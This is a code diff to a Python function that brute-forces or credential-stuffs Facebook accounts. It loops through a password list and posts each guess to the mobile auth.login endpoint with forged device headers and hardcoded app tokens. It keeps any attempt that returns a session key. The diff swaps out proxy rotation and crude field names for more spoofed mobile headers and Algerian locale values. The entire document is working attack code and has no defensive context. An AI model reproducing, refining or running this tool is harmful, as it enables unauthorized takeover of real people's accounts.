@@ -1644,36 +1644,49 @@ def mobile(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             data = {
-            "kids_xudina": str(uuid.uuid4()),
-            "format": "json",
-            "sha_kids_bokachoda": str(uuid.uuid4()),
-            "FUCK_ARAFAT": "true",
-            "family_device_id": str(uuid.uuid4()),
-            "credentials_type": "device_based_login_password",
-            "error_detail_type": "button_with_disabled",
-            "source": "device_based_login",
+            "adid": str(uuid.uuid4()),
             "email": uid,
             "password": pw,
-            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "cpl": "true",
+            "credentials_type": "device_based_login_password",
+            "source": "device_based_login",
+            "error_detail_type": "button_with_disabled",
+            "format": "json",
             "generate_session_cookies": "1",
-            "locale": "en_US",
-            "client_country_code": "US",
+            "generate_analytics_claim": "1",
+            "generate_machine_id": "1",
+            "family_device_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            "locale": "fr_DZ",
+            "client_country_code": "DZ",
+            "device_id": str(uuid.uuid4()),
             "method": "auth.login",
+            "api_key": "882a8490361da98702bf97a021ddc14d",
             "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "api_key": "882a8490361da98702bf97a021ddc14d",}
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
             headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Host": "graph.facebook.com",
-            "User-Agent": UA(),
-            "X-FB-Net-HNI": "45204",
-            "X-FB-SIM-HNI": "45201",
-            "X-FB-Connection-Type": "unknown",
-            "Connection": "Keep-Alive",}
-            url = "https://graph.facebook.com/auth/login"
+            'user-agent': UA(),
+            'accept-encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'content-type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'x-fb-sim-hni': '44501',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'x-fb-net-hni': '44085',
+            'x-fb-device-group': '5120',
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'x-fb-connection-bandwidth': '413859',
+            'x-fb-connection-quality': 'EXCELLENT',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+            'x-fb-friendly-name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'x-fb-http-engine': 'Liger'}
+            url = "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
